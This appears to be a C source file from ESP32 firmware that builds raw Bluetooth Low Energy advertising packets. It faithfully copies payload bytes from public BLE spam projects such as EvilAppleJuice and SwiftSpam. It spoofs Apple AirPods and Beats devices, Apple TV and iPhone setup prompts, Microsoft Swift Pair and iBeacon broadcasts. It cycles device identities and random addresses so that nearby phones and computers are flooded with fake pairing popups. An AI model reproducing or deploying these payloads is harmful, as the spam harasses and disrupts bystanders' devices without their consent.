// main/logic/app_blelab.c —— BLE 实验纯逻辑：把"模式 + 索引"变成一包原始广播字节。
//
// 仅依赖标准 C 头文件，可在主机上直接编译测试（见 tests/test_app_blelab.c）。
// 所有载荷字节都来自公开仓库（EvilAppleJuice-ESP32 / ESP32-SwiftSpam / ESP32-BLEBeaconSpam），
// 这里只做"忠实复刻 + 可配置身份"，不做任何网络动作。
#include "app_blelab.h"

#include <string.h>

// ---------------------------------------------------------------------------
// 苹果设备表：名字 + modelId，按 EvilAppleJuice-ESP32/src/devices.hpp 逐条照录
// ---------------------------------------------------------------------------
// 音频（31 字节载荷，modelId 在索引 7）。
typedef struct {
    const char *name;
    uint8_t     model_id;
} apple_audio_t;

// 设置/配对（23 字节载荷，modelId 在索引 13）。
typedef struct {
    const char *name;
    uint8_t     model_id;
} apple_setup_t;

static const apple_audio_t APPLE_AUDIO[] = {
    {"Airpods",                 0x02},
    {"Power Beats",             0x03},
    {"Beats X",                 0x05},
    {"Beats Solo 3",            0x06},
    {"Beats Studio 3",          0x09},
    {"Airpods Max",             0x0a},
    {"Power Beats Pro",         0x0b},
    {"Beats Solo Pro",          0x0c},
    {"Airpods Pro",             0x0e},
    {"Airpods Gen 2",          0x0f},
    {"Beats Flex",              0x10},
    {"Beats Studio Buds",       0x11},
    {"Beats Fit Pro",           0x12},
    {"Airpods Gen 3",          0x13},
    {"Airpods Pro Gen 2",      0x14},
    {"Beats Studio Buds Plus",  0x16},
    {"Beats Studio Pro",        0x17},
    {"Airpods Pro Gen 2 USB-C", 0x24},
    {"Beats Solo 4",            0x25},
    {"Beats Solo Buds",         0x26},
    {"Software update",         0x2e},
    {"Powerbeats fit",          0x2f},
};

static const apple_setup_t APPLE_SETUP[] = {
    {"AppleTV Setup",                 0x01},
    {"Transfer Number",               0x02},
    {"AppleTV Pair",                  0x06},
    {"Setup New Phone",               0x09},
    {"Homepod Setup",                 0x0b},
    {"AppleTV Homekit Setup",         0x0d},
    {"AppleTV Keyboard Setup",        0x13},
    {"TV Color Balance",              0x1e},
    {"AppleTV New User",              0x20},
    {"Vision Pro",                    0x24},
    {"AppleTV Connecting to Network", 0x27},
    {"AppleTV AppleID Setup",         0x2b},
    {"AppleTV Wireless Audio Sync",    0xc0},
};

#define APPLE_AUDIO_COUNT ((int)(sizeof(APPLE_AUDIO) / sizeof(APPLE_AUDIO[0])))
#define APPLE_SETUP_COUNT ((int)(sizeof(APPLE_SETUP) / sizeof(APPLE_SETUP[0])))

// ---------------------------------------------------------------------------
// 可配置身份（iBeacon / Swift Pair）。未设定时用默认值。
// ---------------------------------------------------------------------------
static uint8_t  g_ib_uuid[16];
static uint16_t g_ib_major = 0;
static uint16_t g_ib_minor = 0;
static int8_t   g_ib_tx   = -59;        // 常见 iBeacon 参考发射功率
static uint32_t g_swift_cod = 0x000400; // 默认：Audio/Video（Rendering），一个合理的占位值
static char     g_swift_name[20];

void app_blelab_set_ibeacon(const uint8_t uuid[16], uint16_t major,
                           uint16_t minor, int8_t tx_power)
{
    if (uuid)     memcpy(g_ib_uuid, uuid, sizeof(g_ib_uuid));
    g_ib_major = major;
    g_ib_minor = minor;
    g_ib_tx   = tx_power;
}

void app_blelab_set_swift_cod(uint32_t cod)
{
    if (cod == 0xFFFFFFFFu) return;     // 哨兵：保留当前值
    g_swift_cod = cod & 0xFFFFFFu;
}

void app_blelab_set_swift_name(const char *name)
{
    g_swift_name[0] = '\0';
    if (!name || !name[0]) return;
    // 最多 19 字节（与 ESP32-SwiftSpam 的名字上限一致），留 1 字节给终止符。
    size_t n = strlen(name);
    if (n > 19) n = 19;
    memcpy(g_swift_name, name, n);
    g_swift_name[n] = '\0';
}

// ---------------------------------------------------------------------------
// PRNG 与随机地址
// ---------------------------------------------------------------------------
uint32_t app_blelab_xorshift32(uint32_t *state)
{
    uint32_t x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

void app_blelab_random_addr(uint32_t *state, uint8_t out[6])
{
    for (int i = 0; i < 6; i++) {
        out[i] = (uint8_t)app_blelab_xorshift32(state);
    }
    out[0] |= 0xF0;   // 随机静态地址的高两位必须为 11（蓝牙规范）
}

// ---------------------------------------------------------------------------
// 苹果设备表访问器
// ---------------------------------------------------------------------------
int app_blelab_apple_count(app_blelab_mode_t mode)
{
    switch (mode) {
    case APP_BLELAB_MODE_APPLE_AUDIO: return APPLE_AUDIO_COUNT;
    case APP_BLELAB_MODE_APPLE_SETUP: return APPLE_SETUP_COUNT;
    default:                         return 0;
    }
}

bool app_blelab_apple_dev(app_blelab_mode_t mode, int index,
                         const char **out_name, uint8_t *out_model_id)
{
    const char *name = NULL;
    uint8_t     mid  = 0;
    bool        ok   = true;

    switch (mode) {
    case APP_BLELAB_MODE_APPLE_AUDIO:
        if (index < 0 || index >= APPLE_AUDIO_COUNT) ok = false;
        else { name = APPLE_AUDIO[index].name; mid = APPLE_AUDIO[index].model_id; }
        break;
    case APP_BLELAB_MODE_APPLE_SETUP:
        if (index < 0 || index >= APPLE_SETUP_COUNT) ok = false;
        else { name = APPLE_SETUP[index].name; mid = APPLE_SETUP[index].model_id; }
        break;
    default:
        ok = false;
        break;
    }

    if (!ok) return false;
    if (out_name)    *out_name = name;
    if (out_model_id) *out_model_id = mid;
    return true;
}

// ---------------------------------------------------------------------------
// 各模式载荷构造
// ---------------------------------------------------------------------------

// 苹果音频：31 字节，前 19 字节有意义，其余补 0（与 EvilAppleJuice 的 31 字节缓冲一致）。
static size_t build_apple_audio(uint8_t model_id, uint8_t *buf, size_t cap)
{
    const size_t need = 31;
    if (cap < need) return need;
    memset(buf, 0, need);
    static const uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
    static const uint8_t body[]   = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
    memcpy(buf + 0, header, sizeof(header));   // 7 字节
    buf[7] = model_id;                          // modelId 在索引 7
    memcpy(buf + 8, body, sizeof(body));        // 11 字节，到索引 18
    return need;
}

// 苹果设置：23 字节，恰好填满。
static size_t build_apple_setup(uint8_t model_id, uint8_t *buf, size_t cap)
{
    const size_t need = 23;
    if (cap < need) return need;
    memset(buf, 0, need);
    static const uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
    static const uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf + 0, prefix, sizeof(prefix));   // 13 字节
    buf[13] = model_id;                         // modelId 在索引 13
    memcpy(buf + 14, suffix, sizeof(suffix));   // 9 字节，到索引 22
    return need;
}

// Swift Pair：Microsoft 厂商特定数据（10 字节）+ 可选 Complete Local Name。
static size_t build_swift_pair(uint8_t *buf, size_t cap)
{
    // CoD 仅取低 24 位，按小端写入载荷。
    uint8_t cod0 = (uint8_t)(g_swift_cod & 0xFF);
    uint8_t cod1 = (uint8_t)((g_swift_cod >> 8) & 0xFF);
    uint8_t cod2 = (uint8_t)((g_swift_cod >> 16) & 0xFF);

    size_t name_len = strlen(g_swift_name);
    if (name_len > 19) name_len = 19;

    size_t need = 10 + (name_len ? (2 + name_len) : 0);
    if (cap < need) return need;

    // 厂商特定数据：长度 9（含 type 之后的 9 字节）、type 0xFF、Microsoft 0x0006、
    // 子场景 0x03（Swift Pair）、flags 0x02、保留 RSSI 0x80、3 字节 CoD。
    buf[0] = 0x09;
    buf[1] = 0xFF;
    buf[2] = 0x06;
    buf[3] = 0x00;
    buf[4] = 0x03;
    buf[5] = 0x02;
    buf[6] = 0x80;
    buf[7] = cod0;
    buf[8] = cod1;
    buf[9] = cod2;

    if (name_len) {
        buf[10] = (uint8_t)(1 + name_len);   // 字段长度 = type + 名字
        buf[11] = 0x09;                       // Complete Local Name
        memcpy(buf + 12, g_swift_name, name_len);
    }
    return need;
}

// iBeacon：27 字节原始广播（长度 0x1A + 0xFF + Apple 0x004C + 0x02 0x15 + UUID + major + minor + tx）。
static size_t build_ibeacon(uint8_t *buf, size_t cap)
{
    const size_t need = 27;
    if (cap < need) return need;
    memset(buf, 0, need);
    buf[0] = 0x1A;                       // 后续数据长度 = 26
    buf[1] = 0xFF;                       // Manufacturer Specific Data
    buf[2] = 0x4C;                       // Apple Company ID 0x004C，小端
    buf[3] = 0x00;
    buf[4] = 0x02;                       // iBeacon 标识
    buf[5] = 0x15;                       // 长度：16 字节 UUID 之后还有 6 字节（major/minor/tx）
    memcpy(buf + 6, g_ib_uuid, 16);      // Proximity UUID
    buf[22] = (uint8_t)(g_ib_major >> 8);  // major，大端
    buf[23] = (uint8_t)(g_ib_major & 0xFF);
    buf[24] = (uint8_t)(g_ib_minor >> 8);  // minor，大端
    buf[25] = (uint8_t)(g_ib_minor & 0xFF);
    buf[26] = (uint8_t)g_ib_tx;          // 测量发射功率（有符号）
    return need;
}

// ---------------------------------------------------------------------------
// 对外入口
// ---------------------------------------------------------------------------
size_t app_blelab_packet_size(app_blelab_mode_t mode)
{
    switch (mode) {
    case APP_BLELAB_MODE_APPLE_AUDIO: return 31;
    case APP_BLELAB_MODE_APPLE_SETUP: return 23;
    case APP_BLELAB_MODE_SWIFT_PAIR:  return 10;   // 不含可选名字
    case APP_BLELAB_MODE_IBEACON:     return 27;
    default:                          return 0;
    }
}

app_blelab_err_t app_blelab_build_packet(app_blelab_mode_t mode, uint32_t index,
                                        uint8_t *buf, size_t cap, size_t *out_len)
{
    if (!buf || !out_len) return APP_BLELAB_ERR_INVALID_ARG;
    if (mode >= APP_BLELAB_MODE_COUNT) {
        *out_len = 0;
        return APP_BLELAB_ERR_INVALID_MODE;
    }

    size_t need = 0;
    int    dev_count = 0;
    uint8_t model_id = 0;

    switch (mode) {
    case APP_BLELAB_MODE_APPLE_AUDIO:
    case APP_BLELAB_MODE_APPLE_SETUP:
        dev_count = app_blelab_apple_count(mode);
        if (dev_count <= 0) {                 // 理论上不会发生，但守住索引
            *out_len = 0;
            return APP_BLELAB_ERR_INVALID_ARG;
        }
        // index 取模，保证任意 uint32_t 都不会越界，也方便 advertiser 循环轮换设备。
        if (app_blelab_apple_dev(mode, (int)(index % (uint32_t)dev_count), NULL, &model_id) != true) {
            *out_len = 0;
            return APP_BLELAB_ERR_INVALID_ARG;
        }
        break;
    default:
        break;
    }

    switch (mode) {
    case APP_BLELAB_MODE_APPLE_AUDIO: need = build_apple_audio(model_id, buf, cap); break;
    case APP_BLELAB_MODE_APPLE_SETUP: need = build_apple_setup(model_id, buf, cap); break;
    case APP_BLELAB_MODE_SWIFT_PAIR:  need = build_swift_pair(buf, cap);            break;
    case APP_BLELAB_MODE_IBEACON:     need = build_ibeacon(buf, cap);              break;
    default:                          *out_len = 0; return APP_BLELAB_ERR_INVALID_MODE;
    }

    if (need > cap) {
        *out_len = need;                       // 写出所需长度，便于调用方扩容
        return APP_BLELAB_ERR_BUF_TOO_SMALL;
    }

    *out_len = need;
    return APP_BLELAB_OK;
}
